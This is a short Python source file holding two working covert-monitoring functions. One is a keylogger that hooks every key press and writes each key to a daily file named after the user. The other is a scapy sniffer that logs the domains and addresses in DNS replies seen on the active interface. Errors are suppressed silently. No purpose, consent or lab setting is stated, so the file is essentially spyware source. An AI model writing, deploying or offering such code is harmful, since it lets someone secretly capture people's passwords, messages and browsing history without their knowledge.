from utilities import user_name, active_interface
import logging
import keyboard
import scapy.all as scapy
import sys
import datetime

def get_daily_log_filename(prefix):
    """
    Returns a log filename for today, e.g. keylog-USERNAME_YYYYMMDD.txt
    """
    today = datetime.datetime.now().strftime("%Y%m%d")
    return f"{prefix}-{user_name()}_{today}.txt"

def setup_logger(log_filename, logger_name):
    logger = logging.getLogger(logger_name)
    logger.setLevel(logging.INFO)
    # Remove all handlers if already set (avoid duplicate logs)
    if logger.hasHandlers():
        logger.handlers.clear()
    handler = logging.FileHandler(log_filename, mode='a')
    formatter = logging.Formatter('%(asctime)s: %(message)s', datefmt='%Y-%m-%d %H:%M:%S')
    handler.setFormatter(formatter)
    logger.addHandler(handler)
    return logger

def key_logger():
    log_filename = get_daily_log_filename("keylog")
    logger = setup_logger(log_filename, "KeyLogger")

    def on_key_press(event):
        key = event.name
        try:
            logger.info(key)
        except Exception:
            pass

    keyboard.on_press(on_key_press)
    try:
        keyboard.wait()
    except Exception:
        sys.exit(0)

def dns_logger():
    log_filename = get_daily_log_filename("dnslog")
    logger = setup_logger(log_filename, "DNSLogger")

    def process_packet(packet):
        if packet.haslayer(scapy.DNS) and packet[scapy.DNS].qr == 1:
            dns = packet[scapy.DNS]
            ancount = dns.ancount
            ans = dns.an
            for _ in range(ancount):
                if ans is None:
                    break
                try:
                    domain = ans.rrname.decode('utf-8') if hasattr(ans.rrname, 'decode') else str(ans.rrname)
                    if ans.type == 1:  # A record
                        ip = ans.rdata
                        logger.info(f'A record: {domain} -> {ip}')
                    elif ans.type == 28:  # AAAA record
                        ip = ans.rdata
                        logger.info(f'AAAA record: {domain} -> {ip}')
                except Exception:
                    pass
                ans = getattr(ans, 'next', None)

    try:
        iface = active_interface()
        if not iface:
            sys.exit(1)
        scapy.sniff(iface=iface, store=False, prn=process_packet)
    except Exception:
        sys.exit(0)